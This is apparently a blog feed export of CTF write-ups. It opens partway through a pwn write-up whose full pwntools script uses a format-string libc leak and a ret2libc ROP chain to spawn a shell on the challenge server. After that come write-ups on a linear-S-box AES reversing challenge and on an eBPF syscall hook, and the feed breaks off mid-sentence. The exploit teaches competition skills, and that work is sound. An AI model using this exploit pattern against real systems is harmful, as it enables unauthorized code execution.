class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># get the names of all the functions calling _gets</span></span><br><span class=\"line\">    calling_gets = get_func_names(xrefs)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># get list of all the stack canaries not containing a newline</span></span><br><span class=\"line\">    canaries = get_stack_canaries()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># retrieve just station numbers</span></span><br><span class=\"line\">    station_numbers = canaries.keys()</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\"># find out if any address lies in both generated lists</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> station_numbers:</span><br><span class=\"line\">        func_name = <span class=\"string\">&quot;station_&quot;</span> + <span class=\"built_in\">str</span>(i)</span><br><span class=\"line\">        addr = idaapi.get_name_ea(<span class=\"number\">0</span>, func_name)        </span><br><span class=\"line\">        <span class=\"keyword\">if</span> addr <span class=\"keyword\">in</span> calling_gets:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(addr))</span><br><span class=\"line\">        </span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure></p>\n<p>And the output of this script gives us the address of  <code>station_14927</code> : the vulnerable one.</p>\n<h2 id=\"step-4-exploiting\"><a class=\"anchor\" href=\"#step-4-exploiting\">#</a> Step 4: Exploiting</h2>\n<p>Now that we have the vulnerable function, let us get down to exploiting it. From the Dockerfile we saw earlier, the idea is to get a shell and do  <code>cat flag.txt</code> , so let's see how we can do it.</p>\n<p>Back to the format string vulnerability.</p>\n<p>We know the  <code>printf()</code>  in  <code>select_station</code>  is vulnerable, and we know why. Let us view the register state before the  <code>printf()</code>  call in  <code>select_station</code></p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-16.png\" alt=\"alt text\" /></p>\n<p>Running  <code>info proc mappings</code>  on GDB tells us what is mapped to where in virtual memory, so we can make use of that here</p>\n<p>We can see that the address that  <code>rsi</code>  contains is actually a LIBC address!</p>\n<p>We can assume ASLR is on for this program.</p>\n<p>One interesting thing to note about ASLR is that while it does modify the actual addresses of variables and functions in your program, it usually does not touch the distance between these variables (this distance is also known as an &quot;offset&quot;).</p>\n<p>For example, if we run a program for the first time, and a variable  <code>x</code>  is at address  <code>0x1000</code> , and a variable  <code>y</code>  is at  <code>0x1050</code> , and we run this program for a second time, we would see that the address of the variable  <code>x</code>  has now changed to  <code>0x1450</code> , but  <code>y</code>  remains a constant offset from it at  <code>0x14a0</code> .</p>\n<p>This is because it would take way too long for ASLR to randomise the locations of <em>every</em> single variable in a given program. What is does instead is randomise the <em>base</em> address of various memory mappings, one of which is LIBC.</p>\n<p>We can utilise this fact to find the base address of  <code>libc</code>  every time the program is run. This is known as a  <code>ret2libc</code>  attack</p>\n<p>There are 4 main steps to  <code>ret2libc</code>  attacks:</p>\n<ol>\n<li>Find an address that points to something in the libc by using something like a format string vulnerability</li>\n<li>Use the address above to calculate the base address of libc</li>\n<li>Calculate addresses of any libc functions we like using the base address</li>\n<li>Use a different exploit (BOF in our case) to overwrite the return address with the libc function we would like to jump to</li>\n</ol>\n<p>Let us leak an address as an example, by running the program with the input &quot;14927-%p-&quot;</p>\n<p>The output I get is:  <code>0x7ffff7fc2723</code></p>\n<p><img data-src=\"/images/post_images/Writeup-lost-canary-UIUCTF24/image-17.png\" alt=\"alt text\" /></p>\n<p>All I have to do, is subtract the base address of the  <code>libc</code>  I have (highlighted in the screenshot), from it, to get the constant offset difference, which comes out to be:  <code>0x1ed723</code> . I can use this information to get the base address of the libc every time the program is run now, through the format string vulnerability in  <code>main()</code> .</p>\n<p>Return Oriented Programming comes in handy when buffer overflows allow us to overwrite a program's call stack with what we want. Instead of us having to craft our own shellcode, all we have to do is take already existing pieces of code (known as &quot;gadgets&quot;) and put them together to craft our exploit - we will see how we can do that.</p>\n<p>These gadgets are usually short bursts of instructions tailored to do specific things, each ending with a  <code>ret</code>  instruction. We can utilise this to control execution flow as per our will.</p>\n<p>The beauty of ROP comes from it's unique ability to harness code from any part of the binary (given it is executable).</p>\n<p>First, we need to go gadget hunting to find what we need. Since we can write what we want to the stack, and we know  <code>rdi</code>  is the first place looked at by functions for their arguments, we would ideally want something that would allow us to pop the top value from the stack and into  <code>rdi</code> , then perform a  <code>ret</code> . Let us look for such an instruction in the libc with a tool known as <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0pvbmF0aGFuU2Fsd2FuL1JPUGdhZGdldA==\">ROPgadget</span>.</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./libc.so.6 | grep &quot;pop rdi ; ret&quot;</span><br><span class=\"line\">0x0000000000023b6a : pop rdi ; ret</span><br><span class=\"line\">0x00000000000f57ad : pop rdi ; retf</span><br><span class=\"line\">0x0000000000144ba9 : pop rdi ; retf 0xa</span><br></pre></td></tr></table></figure></p>\n<p>We can take the first one and ignore the rest. The output shows that at the offset  <code>0x24b6a</code>  from the libc base, is the gadget we are looking for.</p>\n<p>Next, we also need to find a  <code>ret</code>  instruction.</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ROPgadget --binary ./libc.so.6 | awk &#x27;&#123;print $1 $2 $3&#125;&#x27; | grep ret</span><br><span class=\"line\">0x0000000000022679:ret</span><br></pre></td></tr></table></figure></p>\n<p>So  <code>ret</code>  is at 0x22679.</p>\n<p>Now, we are ready to craft our payload that does the following:</p>\n<ol>\n<li>Send 4 &quot;A&quot;s and the canary to get to the return address on the stack</li>\n<li>Overwrite the return address on the stack with the  <code>pop rdi</code>  gadget</li>\n<li>Set the value of  <code>rdi</code>  to &quot;/bin/sh&quot;</li>\n<li>Overwrite the return address again with with the address of system</li>\n</ol>\n<p>Let us see how this can be accomplished with a full fledged pwntools script</p>\n<p><figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> icecream <span class=\"keyword\">import</span> ic</span><br><span class=\"line\"><span class=\"keyword\">import</span> tty</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Set up pwntools for the correct architecture</span></span><br><span class=\"line\">exe = <span class=\"string\">&quot;./lost&quot;</span></span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\">context.binary = elf = ELF(exe)</span><br><span class=\"line\">context.log_level = <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.aslr = <span class=\"literal\">True</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">start</span>(<span class=\"params\">argv=[], *a, **kw</span>):</span><br><span class=\"line\">    <span class=\"string\">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.REMOTE:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> remote(<span class=\"string\">&quot;lost-canary.chal.uiuc.tf&quot;</span>, <span class=\"number\">1337</span>, ssl=<span class=\"literal\">True</span> )</span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.GDB:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> process([exe] + argv, *a, **kw)</span><br><span class=\"line\"></span><br><span class=\"line\">gdbscript = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    b* select_station+104</span></span><br><span class=\"line\"><span class=\"string\">    c</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span>.<span class=\"built_in\">format</span>(**<span class=\"built_in\">locals</span>())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Useful macros</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sl</span>(<span class=\"params\">a</span>): <span class=\"keyword\">return</span> r.sendline(a)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">s</span>(<span class=\"params\">a</span>): <span class=\"keyword\">return</span> r.send(a)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sa</span>(<span class=\"params\">a, b</span>): <span class=\"keyword\">return</span> r.sendafter(a, b)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">sla</span>(<span class=\"params\">a, b</span>): <span class=\"keyword\">return</span> r.sendlineafter(a, b)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">re</span>(<span class=\"params\">a</span>): <span class=\"keyword\">return</span> r.recv(a)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ru</span>(<span class=\"params\">a</span>): <span class=\"keyword\">return</span> r.recvuntil(a)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">rl</span>(): <span class=\"keyword\">return</span> r.recvline()</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">i</span>(): <span class=\"keyword\">return</span> r.interactive()</span><br><span class=\"line\">eof = <span class=\"built_in\">chr</span>(tty.CEOF)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">r = start()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># send the payload to generate the libc leak </span></span><br><span class=\"line\">sl(<span class=\"string\">b&quot;14927-%p-&quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">b&quot;-&quot;</span>)</span><br><span class=\"line\">libc.address = <span class=\"built_in\">int</span>(ru(<span class=\"string\">b&quot;-&quot;</span>)[:-<span class=\"number\">1</span>], <span class=\"number\">16</span>) - <span class=\"number\">0x1ed723</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get the address of the pop rdi gadget from the offset we got earlier </span></span><br><span class=\"line\">prdi = libc.address + <span class=\"number\">0x0000000000023b6a</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># get the address of the ret gadget </span></span><br><span class=\"line\">ret = libc.address + <span class=\"number\">0x0000000000022679</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># send the payload as we had seen above, to overwrite rip, replace rdi with &quot;/bin/sh&quot;, and finally call system </span></span><br><span class=\"line\">sl(<span class=\"string\">b&quot;A&quot;</span>*(<span class=\"number\">4</span>) + p64(<span class=\"number\">0x7361754569205965</span>) + p64(<span class=\"number\">0</span>) + p64(ret) + p64(prdi) + p64(<span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))) + p64(libc.sym.system))</span><br><span class=\"line\"></span><br><span class=\"line\">r.interactive()</span><br></pre></td></tr></table></figure></p>\n<p>So that is the entire challenge! A unique reversing + binary exploitation to top it all off.</p>\n<p>If you guys have any questions about anything mentioned in the writeups, feel free to reach out to me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly94LmNvbS90aGVfbTNjaGFuaWNf\">X/Twitter</span> or on Discord at  <code>the.m3chanic</code> . Cheers.</p>\n",
            "tags": [
                "Writeup",
                "Security",
                "Reversing",
                "CTF",
                "Writeup",
                "Pwn"
            ]
        },
        {
            "id": "https://the-m3chanic.github.io/2024/02/26/Writeup-t0y-b0x-bi0sCTF-2024/",
            "url": "https://the-m3chanic.github.io/2024/02/26/Writeup-t0y-b0x-bi0sCTF-2024/",
            "title": "Writeup - t0y-b0x - bi0sCTF 2024",
            "date_published": "2024-02-26T17:09:06.000Z",
            "content_html": "<p><strong>tl;dr</strong></p>\n<ul>\n<li>Binary obfuscation with hidden anti-debug checks</li>\n<li>Linear Cryptanalysis (AES with linearly dependent SBOX)</li>\n</ul>\n<p><span id=\"more\"></span></p>\n<p><strong>Challenge points</strong>: 758<br />\n<strong>No. of solves</strong>: 21<br />\n<strong>Challenge Author(s)</strong> : <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS9TYXJpbktyaXNobmFuUg==\">Sans</span>, <span class=\"exturl\" data-url=\"aHR0cHM6Ly90d2l0dGVyLmNvbS90aGVfbTNjaGFuaWNf\">the.m3chanic</span></p>\n<h2 id=\"challenge-description\"><a class=\"anchor\" href=\"#challenge-description\">#</a> Challenge description:</h2>\n<p>All my toys are shuffled üò¶</p>\n<h2 id=\"initial-analysis\"><a class=\"anchor\" href=\"#initial-analysis\">#</a> Initial Analysis</h2>\n<p>We're given a stripped C binary along with a  <code>ciphertext.txt</code> .</p>\n<p><img data-src=\"/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image.png\" alt=\"alt text\" /></p>\n<p>We see that the binary is asking for up to 16 bytes of input followed by upto 1024 bytes in the next line - already kind of suspicious, hints AES, but let's see.</p>\n<p>Now right off the bat, there's a conditional check to set an array to one or the other value based on a global variable, let's check that out.</p>\n<p><img data-src=\"/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-1.png\" alt=\"alt text\" /></p>\n<p>There are only 2 xrefs to this global symbol, one of them which we are currently checking out - whereas the other one seems to be in another function.</p>\n<p>IDA is unable to decompile it properly, but it says that the function has inline assembly present in it - let's look at that.</p>\n<p><img data-src=\"/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-2.png\" alt=\"alt text\" /></p>\n<p>This looks like a fancy way of setting up a syscall, specifically  <code>ptrace</code> , so it's an anti-debug check.<br />\nWe can simply patch the jump condition, or nop out this entire function itself - up to whoever is reversing it.</p>\n<p>The output of this function seems to change the values that a specific array is set to, which we'll find to be important later.<br />\nAdditionally, the array that is being set is of length 256, another AES hint.</p>\n<p>The array that is copied into this is initialised from another function, which you can analyse by debugging and see that all it does is initialise an array with values from 0-255.</p>\n<p><img data-src=\"/images/post_images/Writeup-t0y-b0x-bi0sCTF-2024/image-3.png\" alt=\"alt text\" /></p>\n<p>This looks like the mix columns function from AES, it also calls the  <code>coef_mult</code>  that is implemented in AES.</p>\n<p>At this point we can conclude that this binary is implementing AES, but with some modifications to it. The only modification being that the SBOX being used in it is linear (0, 1, 2...255). We can find this out by inspecting the arguments being passed to the  <code>aes_encrypt</code>  function in main.</p>\n<h2 id=\"solving-linear-aes\"><a class=\"anchor\" href=\"#solving-linear-aes\">#</a> Solving linear AES</h2>\n<p>Looking at the implementation of the  <code>sub_bytes</code>  function in the binary, we can see this<br />\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">sub_bytes</span><span class=\"params\">(<span class=\"type\">uint8_t</span> *state)</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span> i, j;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">4</span>; i++) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span> (j = <span class=\"number\">0</span>; j &lt; Nb; j++) &#123;</span><br><span class=\"line\">\t\t\tstate[Nb*i+j] = s_box[state[Nb*i+j]];</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>This is the only non-linear part of AES, and it's what makes AES resistant to linear attacks. The standard SBOX was designed with this in mind. In this binary, however, we use a linear SBOX.</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>S</mi><mi>B</mi><mi>O</mi><mi>X</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo>‚äï</mo><mi>j</mi><mo>‚äï</mo><mn>0</mn><mo stretchy=\"false\">]</mo><mo>=</mo><mi>S</mi><mi>B</mi><mi>O</mi><mi>X</mi><mo stretchy=\"false\">[</mo><mi>i</mi><mo stretchy=\"false\">]</mo><mo>‚äï</mo><mi>S</mi><mi>B</mi><mi>O</mi><mi>X</mi><mo stretchy=\"false\">[</mo><mi>j</mi><mo stretchy=\"false\">]</mo><mo>‚äï</mo><mi>S</mi><mi>B</mi><mi>O</mi><mi>X</mi><mo stretchy=\"false\">[</mo><mn>0</mn><mo stretchy=\"false\">]</mo></mrow><annotation encoding=\"application/x-tex\">SBOX[i \\oplus j \\oplus 0] = SBOX[i] \\oplus SBOX[j] \\oplus SBOX[0]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">‚äï</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.85396em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">‚äï</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">‚äï</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mopen\">[</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mclose\">]</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">‚äï</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"mord mathnormal\" style=\"margin-right:0.05017em;\">B</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">O</span><span class=\"mord mathnormal\" style=\"margin-right:0.07847em;\">X</span><span class=\"mopen\">[</span><span class=\"mord\">0</span><span class=\"mclose\">]</span></span></span></span></p>\n<p>The new substitution box can be represented as a linear operation on bits, with just XORs and shuffling bits. Because of this - the AES encryption operation is now affine. Since the first block of plaintext and ciphertext, you can construct a matrix and recover the key this way, using it to decrypt the rest of the ciphertext.</p>\n<p>You can refer to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oYWNrbWQuaW8vQHZpc2hpc3dvei9yMTBQN2tud2o=\">this</span> and <span class=\"exturl\" data-url=\"aHR0cHM6Ly9rZXZpbmxpdS5tZS9wb3N0cy9saW5lYXItY3J5cHRhbmFseXNpcy8=\">this</span> article for more information on this vulnerability.</p>\n<p>Overall, this was an easy to medium challenge, with just some obfuscation to hide some things being generated in the binary and a vulnerable implementation of AES being implemented. I hope you guys had fun solving the challenge and learnt something new from it as well! üòÉ</p>\n",
            "tags": [
                "Writeup",
                "Reversing",
                "CTF",
                "Writeup",
                "Crypto"
            ]
        },
        {
            "id": "https://the-m3chanic.github.io/2024/02/26/Writeup-beehive-bi0sCTF-2024/",
            "url": "https://the-m3chanic.github.io/2024/02/26/Writeup-beehive-bi0sCTF-2024/",
            "title": "Writeup - beehive - bi0sCTF 2024",
            "date_published": "2024-02-26T03:23:31.000Z",
            "content_html": "<p><strong>tl;dr</strong></p>\n<ul>\n<li>Custom hook to syscall 0x31337 using eBPF</li>\n<li>Check on the argument passed to syscall to verify correct/incorrect key</li>\n</ul>\n<h2 id=\"challenge-description\"><a class=\"anchor\" href=\"#challenge-description\">#</a> Challenge description:</h2>\n<p>according to all known laws of aviation, there is no way a bee should be able to fly</p>\n<p>In this writeup I'll be covering the challenge I authored for bi0s CTF, 2024.<br />\nI intended for this to be an easy warmup challenge for the players, and hopefully some people learned some new stuff from it as well üòÉ</p>\n<h2 id=\"initial-analysis\"><a class=\"anchor\" href=\"#initial-analysis\">#</a> Initial Analysis</h2>\n<p>In the handout, there is a single file,  <code>beehive.o</code> , let's take a look at what kind of file it is</p>\n<p><img data-src=\"/images/post_images/Writeup-beehive-bi0sCTF-2024/image.png\" alt=\"file type\" /></p>\n<p>So it's an ELF file, but of type eBPF. What is eBPF?</p>\n<p>(I'm going to dive a little deep into eBPF and things surrounding it. If you're only here for the solution to the challenge, you can skip to the <a href=\"#the-solution\">solution</a>)</p>\n<h2 id=\"understanding-ebpf\"><a class=\"anchor\" href=\"#understanding-ebpf\">#</a> Understanding eBPF</h2>\n<p>eBPF is a technology that can be used in the Linux kernel that is like running a very tightly bound (ability-wise) program directly in the kernel space. It is an event-driven language that can be used to hook kernel actions and perform specific tasks.</p>\n<p>It runs natively in the kernel space with the help of a JIT compiler.</p>\n<p>It‚Äôs basically a kernel level virtual machine that allows for programming of certain kernel level tasks, such as packet filtering, tracing, etc. Essentially a small computer inside the kernel that can run custom programs with restricted access.</p>\n<p>Basically, think of it as a Kernel level javascript running inside a restrictive VM.</p>\n<p>The obvious question that might come in your mind is - <strong>How is eBPF different from normal kernel drivers or kernel modules</strong>?</p>\n<p>Well, the answer to that is simple:<br />\neBPF programs don‚Äôt have nearly the amount of permissions as a regular kernel module, so you could say that they run in a much more constrained environment. They can‚Äôt make any drastic changes to the behaviour of the kernel, so this adds to their security and can help in reducing crashes. It‚Äôs  perfectly in between a user program and a kernel program, in the sense that it runs in the kernel space, but with restrictions that differentiate it from an actual kernel module.</p>\n<p>Now that we've got the basics out of the way, let's get back to solving the challenge.</p>\n<h2 id=\"our-approach\"><a class=\"anchor\" href=\"#our-approach\">#</a> Our Approach</h2>\n<p>Some google searches tell us that eBPF can be disassembled using  <code>llvm</code> , so let's give that a try</p>\n<p><img data-src=\"/images/post_images/Writeup-beehive-bi0sCTF-2024/image-1.png\" alt=\"llvm output\" /></p>\n<p>Sure enough, we get the output, and in that we see a function called  <code>weird_function</code> , now let's take a look at what it does</p>\n<p>One thing to keep in mind is: eBPF has its own instruction set architecture, so everything from registers to calling convention will be different</p>\n<p>Quick overview of eBPF architecture:<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eBPF is a RISC register machine with 11 registers in total. Each 64-bits in size. </span><br><span class=\"line\"></span><br><span class=\"line\">9 of these registers are general purpose, with arbitrary read-write over each of them. One register is a read-only stack pointer, and one implicit program counter (in the sense, we can only jump to a particular offset with it). </span><br><span class=\"line\"></span><br><span class=\"line\">The VM registers are always 64-bits wide, even if it‚Äôs running on a 32-bit processor, the rest of the bits are just zeroed out in that case. </span><br><span class=\"line\"></span><br><span class=\"line\">r0 register holds the return value of helper function calls</span><br><span class=\"line\"></span><br><span class=\"line\">r1-r5 hold the function arguments for kernel function calls, r6-r9 are callee saved registers </span><br><span class=\"line\"></span><br><span class=\"line\">r0 also stores the exit value when the eBPF program exits from the kernel.</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"understanding-the-challenge\"><a class=\"anchor\" href=\"#understanding-the-challenge\">#</a> Understanding the challenge</h2>\n<p>Now, the first few instructions from the dump kind of give us an idea of what's going on here.</p>\n<p>A bunch of stuff is loaded on the stack first, following which the last value loaded on top is later compared to 0x31337.</p>\n<p>In eBPF, whenever a syscall is made, arguments passed to the syscall are pushed on the stack in reverse order, and the syscall number is pushed last (i.e, at the top). We can see that our program is doing something similar here.</p>\n<p>We know that eBPF harbours the capability to hook onto syscalls on the kernel, so could it be possible that it is trying to hook onto syscall 0x31337?<br />\nLet's confirm that hunch.</p>\n<p>A failed comparison of the syscall number with 0x31337 leads us to label-18, which is</p>\n<p><img data-src=\"/images/post_images/Writeup-beehive-bi0sCTF-2024/image-2.png\" alt=\"exit label\" /></p>\n<p>So I think we would need to make the syscall number 0x31337 to interact with this program. But what do we pass to it?</p>\n<p><img data-src=\"/images/post_images/Writeup-beehive-bi0sCTF-2024/image-3.png\" alt=\"strings output\" /></p>\n<p>Seems like the program is asking for a key, and verifies that key for us.</p>\n<p>Obviously the entire program can't be efficiently analysed using just the object dump, so I will switch to IDA PRO for the remainder of this writeup.<br />\nBy default, IDA is not capable of recognising this machine type, but there is a handy <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2N5bGFuY2UvZUJQRl9wcm9jZXNzb3I=\">processor</span> plugin that supports eBPF.</p>\n<p>The output still doesn't look too clean on IDA, so we can run the scripts on the processor repo to relocate maps and clean up eBPF helper calls for us.</p>\n<p>(To run script files on IDA: File -&gt; Script file -&gt; <span class=\"exturl\" data-url=\"aHR0cDovL2ZpbGVuYW1lLnB5\">filename.py</span>)</p>\n<p>The first few blocks of the disassembly seem to be telling us some pretty obvious things, it takes input, copies it to a kernel land string, then stores it.</p>\n<p>How does it reference it though?<br />\nLet's look at this logically - we know the binary has a print statement somewhere, and it prints 1 of 2 things</p>\n<p><img data-src=\"/images/post_images/Writeup-beehive-bi0sCTF-2024/image-5.png\" alt=\"correct incorrect print\" /></p>\n<p>How is it referencing the correct and incorrect strings?</p>\n<p>We can see some constants being loaded into  <code>r1</code>  in each block, and that constant just happens to be the offset of the strings &quot;Key is correct!&quot; and &quot;Key is incorrect!&quot;, from the .rodata section.  <code>r2</code>  just holds the length of the string to be printed.</p>\n<p>I don't want to get into too much detail about assembly level reversing here, so I will mention the required details, while trying to retain as much information as possible<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">r1 --&gt; loop counter for byte by byte encryption</span><br><span class=\"line\">r2 --&gt; contains the pointer to current encrypted byte </span><br><span class=\"line\">r3 --&gt; is_correct flag </span><br></pre></td></tr></table></figure></p>\n<p>And, a python 